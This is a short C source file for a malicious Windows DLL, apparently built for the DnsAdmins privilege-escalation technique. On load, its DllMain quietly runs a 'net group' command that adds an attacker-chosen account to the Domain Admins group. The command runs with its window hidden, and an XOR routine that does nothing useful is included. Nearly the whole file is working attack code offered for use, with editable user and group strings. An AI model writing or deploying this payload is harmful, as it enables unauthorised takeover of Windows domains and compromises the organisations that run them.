#include <windows.h>
#include <stdio.h>
#include <string.h>

// Note: Compile using x86_64-w64-mingw32-gcc -shared -o payload.dll dnsadmins_add_user.c

// === 🔧 EDIT THESE STRINGS ===
char username[] = "netadm";
char groupname[] = "domain admins";

// XOR key for simple obfuscation
#define XOR_KEY 0x25

// XOR function
void xor(char* str, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {

        char command[512];
        snprintf(command, sizeof(command),
            "cmd.exe /c net group \"%s\" %s /add /domain", groupname, username);

        // XOR the command
        size_t len = strlen(command);
        xor(command, len, XOR_KEY);

        // Deobfuscate and execute
        xor(command, len, XOR_KEY); // undo XOR
        WinExec(command, SW_HIDE);
    }
    return TRUE;
}
